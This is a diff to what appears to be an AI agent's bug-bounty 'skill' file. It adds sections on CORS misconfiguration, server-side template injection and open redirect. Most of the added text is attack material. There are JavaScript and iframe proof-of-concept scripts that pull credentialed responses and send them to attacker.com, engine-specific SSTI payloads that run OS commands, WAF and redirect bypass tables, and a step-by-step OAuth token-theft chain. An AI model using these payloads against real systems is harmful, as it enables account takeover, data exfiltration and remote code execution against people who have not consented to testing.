@@ -1,9 +1,9 @@
 ---
 name: exotic-vulns
-description: 35 exotic and less-known web vulnerability classes (21-55) that most hunters miss. Covers JWT attacks, prototype pollution, deserialization, XXE, WebSockets, HTTP/2 desync, DNS rebinding, CORS deep, insecure randomness, LDAP injection, NoSQL expanded, rate limit bypass, clickjacking advanced, CRLF injection, web cache deception, server-side prototype pollution, postMessage, CSS injection, dangling markup, ESI injection, PDF SSRF, email header injection, subdomain delegation takeover, OAuth token theft via Referer, timing side channels, integer overflow, ReDoS, host header poisoning expanded, GraphQL deep, dependency confusion, client-side desync, HTTP parameter pollution, mass assignment, path traversal expanded, WebSocket IDOR. Use when hunting less-saturated bug classes that pay big.
+description: 38 exotic and less-known web vulnerability classes (21-58) that most hunters miss. Covers JWT attacks, prototype pollution, deserialization, XXE, WebSockets, HTTP/2 desync, DNS rebinding, CORS deep, SSTI, open redirect, insecure randomness, LDAP injection, NoSQL expanded, rate limit bypass, clickjacking advanced, CRLF injection, web cache deception, server-side prototype pollution, postMessage, CSS injection, dangling markup, ESI injection, PDF SSRF, email header injection, subdomain delegation takeover, OAuth token theft via Referer, timing side channels, integer overflow, ReDoS, host header poisoning expanded, GraphQL deep, dependency confusion, client-side desync, HTTP parameter pollution, mass assignment, path traversal expanded, WebSocket IDOR. Use when hunting less-saturated bug classes that pay big.
 ---
 
-# EXOTIC VULN CLASSES — 35 Classes (21-55)
+# EXOTIC VULN CLASSES — 38 Classes (21-58)
 
 Less-saturated, high-signal bug classes. Root cause, payloads, bypass tables, impact chains.
 
@@ -2935,6 +2935,190 @@ fetch('https://target.com/api/health', {
 - **#48 OAuth Referer** — implicit flow still common in old apps
 - **#50 Integer Overflow** — e-commerce goldmine
 - **#35 Rate Limit Bypass** — enables all brute-force attacks
+
+---
+
+---
+
+## 56. CORS MISCONFIGURATION (DEEP)
+> CORS bugs remain among the most common high-severity findings even on well-tested targets.
+
+### Scanner
+```bash
+python3 tools/cors_scanner.py --target https://app.example.com --dry-run
+python3 tools/cors_scanner.py --target https://app.example.com --json
+python3 tools/cors_scanner.py --url-list urls.txt --rate 0.5
+```
+
+### Variants
+
+**V1: Origin Reflection**
+Server reflects arbitrary Origin back in `Access-Control-Allow-Origin`:
+```bash
+curl -H "Origin: https://evil.com" https://api.target.com/user -v
+# Look for: Access-Control-Allow-Origin: https://evil.com
+#           Access-Control-Allow-Credentials: true   ← CRITICAL if both present
+```
+
+**V2: Null Origin (sandboxed iframe)**
+```bash
+curl -H "Origin: null" https://api.target.com/user -v
+# Look for: Access-Control-Allow-Origin: null
+```
+PoC:
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
+  <script>
+    fetch('https://api.target.com/sensitive', {credentials:'include'})
+      .then(r=>r.text()).then(d=>top.location='https://attacker.com/?d='+btoa(d))
+  </script>
+"></iframe>
+```
+
+**V3: Subdomain Wildcard**
+```bash
+curl -H "Origin: https://evil.target.com" https://api.target.com/user -v
+# If reflected: attacker can use XSS on any subdomain
+```
+
+**V4: Credential Exposure (CRITICAL)**
+Both conditions required for exploitability:
+1. `Access-Control-Allow-Origin` reflects attacker-controlled origin
+2. `Access-Control-Allow-Credentials: true`
+
+PoC:
+```javascript
+fetch('https://api.target.com/account', {credentials: 'include'})
+  .then(r => r.json())
+  .then(data => fetch('https://attacker.com/steal?d=' + JSON.stringify(data)));
+```
+
+### Bypass Table
+| Technique | Payload |
+|---|---|
+| Prefix match | `https://target.com.evil.com` |
+| Suffix bypass | `https://eviltarget.com` (if regex `.*target.com`) |
+| Null origin | `Origin: null` |
+| Subdomain XSS chain | XSS on `cdn.target.com` → CORS to `api.target.com` |
+
+### Impact Chain
+CORS reflection + credentials → Account takeover, PII exfil, CSRF bypass (when SameSite=None)
+
+---
+
+## 57. SERVER-SIDE TEMPLATE INJECTION (SSTI)
+> SSTI often leads directly to RCE. Engine identification is key.
+
+### Scanner
+```bash
+python3 tools/ssti_scanner.py --target https://app.example.com/search --dry-run
+python3 tools/ssti_scanner.py --target https://app.example.com/search --param q --json
+python3 tools/ssti_scanner.py --url-list urls.txt --rate 0.5
+```
+
+### Detection Probe
+Send `{{7*7}}` — if `49` appears in response, template injection is confirmed.
+
+Universal probe set (test all, identify engine by which returns 49):
+| Payload | Engine |
+|---|---|
+| `{{7*7}}` | Jinja2, Twig, Pebble |
+| `${7*7}` | Freemarker, Spring EL, EJS |
+| `<%= 7*7 %>` | ERB (Ruby) |
+| `#{7*7}` | Ruby (alternative) |
+| `${{7*7}}` | Thymeleaf |
+| `{{= 7*7}}` | EJS |
+| `{7*7}` | Pug (partial) |
+
+### Engine-Specific RCE Payloads
+
+**Jinja2 (Python)**
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}
+```
+
+**Twig (PHP)**
+```
+{{ ['id']|filter('system') }}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+**Freemarker (Java)**
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+```
+
+**ERB (Ruby)**
+```
+<%= `id` %>
+<%= system("id") %>
+```
+
+**Spring EL (Java)**
+```
+${T(java.lang.Runtime).getRuntime().exec('id')}
+```
+
+### WAF Bypass Table
+| Technique | Example |
+|---|---|
+| URL encoding | `%7B%7B7*7%7D%7D` |
+| Unicode spaces | `{{7*\u00097}}` |
+| Comment prefix | `{#comment#}{{7*7}}` |
+| Filter chain (Twig) | `{{ "id"|filter('passthru') }}` |
+| Concatenation | `{{'7'*7}}` → `7777777` (string repeat) |
+
+### Impact Chain
+SSTI confirmed → File read (`/etc/passwd`) → OS command execution → Full RCE
+
+---
+
+## 58. OPEN REDIRECT
+> Often undervalued alone but critical when chained with OAuth/phishing/SSRF.
+
+### Scanner
+```bash
+python3 tools/open_redirect_scanner.py --target https://app.example.com/login --dry-run
+python3 tools/open_redirect_scanner.py --target https://app.example.com/login --json
+python3 tools/open_redirect_scanner.py --url-list urls.txt --rate 0.5
+```
+
+### Common Parameters (test all)
+`url`, `redirect`, `next`, `return`, `redir`, `destination`, `continue`, `goto`, `link`, `target`, `path`, `out`, `view`, `callback`, `return_to`, `redirect_to`, `redirect_uri`, `return_url`
+
+### Bypass Techniques
+
+| Technique | Payload | Notes |
+|---|---|---|
+| Protocol-relative | `//evil.com` | Parsed as `https://evil.com` |
+| Backslash | `/\evil.com` | IE/Edge historical |
+| At-sign | `https://target.com@evil.com` | Browser goes to evil.com |
+| URL-encoded slash | `https://evil%2Ecom` | Parser confusion |
+| Double-encoded | `%252F%252Fevil.com` | Double decode |
+| Tab injection | `https://evil.com%09` | Trailing tab |
+| Newline injection | `https://evil.com%0a` | CRLF bypass |
+| Fragment bypass | `https://evil.com#target.com` | Fragment ignored in dest check |
+| Parameter pollution | `?next=safe.com&next=evil.com` | Last-wins |
+| IPv6 | `https://[::1]` → redirect | Internal access |
+| Unicode normalization | `https://ℯvil.com` | IDN homograph |
+
+### OAuth Chain (HIGH IMPACT)
+```
+Step 1: Find OAuth flow with redirect_uri parameter
+Step 2: Confirm open redirect on target domain: target.com/redirect?url=https://attacker.com
+Step 3: Use as redirect_uri: ?redirect_uri=https://target.com/redirect?url=https://attacker.com
+Step 4: After OAuth completes, access_token leaked to attacker via Referer or URL
+```
+
+### Validation
+Confirm by following the redirect chain. True positive requires final destination to be attacker-controlled domain.
+
+### Scanner Table Update
+| Scanner | Bug Class |
+|---|---|
+| `cors_scanner.py` | CORS misconfiguration (6 test vectors) |
+| `ssti_scanner.py` | SSTI (10 engines, WAF bypass, blind detection) |
+| `open_redirect_scanner.py` | Open redirect (18 params, 30+ bypass techniques) |
 
 ---
 
